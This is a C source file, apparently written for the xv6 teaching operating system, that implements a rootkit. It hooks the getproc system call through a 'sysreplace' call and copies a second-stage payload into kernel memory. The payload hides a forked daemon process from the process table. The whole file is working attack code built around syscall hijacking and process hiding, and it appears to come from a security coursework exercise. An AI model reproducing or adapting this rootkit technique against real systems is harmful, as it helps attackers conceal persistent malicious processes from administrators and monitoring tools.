#include "user.h"
#include "fcntl.h"
#include "proc.h"

int (*oldGetproc)(void*);
int daemonPid;

int exploitStage2() {
    int eip = 0;
    int retval;
    int (*realGetproc)(void);
    int hiddenPid;
    struct proctable *myptable;
    int i;
    /* int tmp; */

    // Grab our eip from eax
    asm("mov %%eax, %0" : "=r" (eip));
    realGetproc = (int(*)(void)) (*(int*)(eip - sizeof(int) * 2));
    hiddenPid = *(int*)(eip - sizeof(int));
    retval = realGetproc();

    myptable = *(struct proctable **)(proc->tf->esp + 4);

    for (i = 0; i < NPROC; ++i)
    {
        if (myptable->proc[i].pid == hiddenPid)
        {
            myptable->proc[i].state = UNUSED;
            myptable->proc[i].pid = 0;
        }
    }

    return retval;
}

void* exploitStage1() {
    int *(*kalloc)(void);
    int *newpage;

    kalloc = (int*(*)())findkalloc();
    newpage = kalloc();
    newpage[0] = (int)oldGetproc;
    newpage[1] = daemonPid;

    memmove(&newpage[2], &exploitStage2, 1024);

    return &newpage[2];
}

void injectRootkit() {
    struct proctable *dummy = 0;
    int newpage;
    sysreplace(23, (uint) &exploitStage1, (uint) &oldGetproc);
    newpage = getproc(dummy);
    sysreplace(23, (uint) newpage, (uint) &oldGetproc);
}

int main(int argc, char *argv[])
{
    int output;
    int curruptime;

    if ((daemonPid = fork()) > 0) {
        injectRootkit();
        exit();
    }

    while(1)
    {
        curruptime = uptime();
        output = open("badproc.out", O_CREATE | O_WRONLY);
        printf(output, "%d\n", curruptime);
        close(output);
        sleep(1000);
    }
}
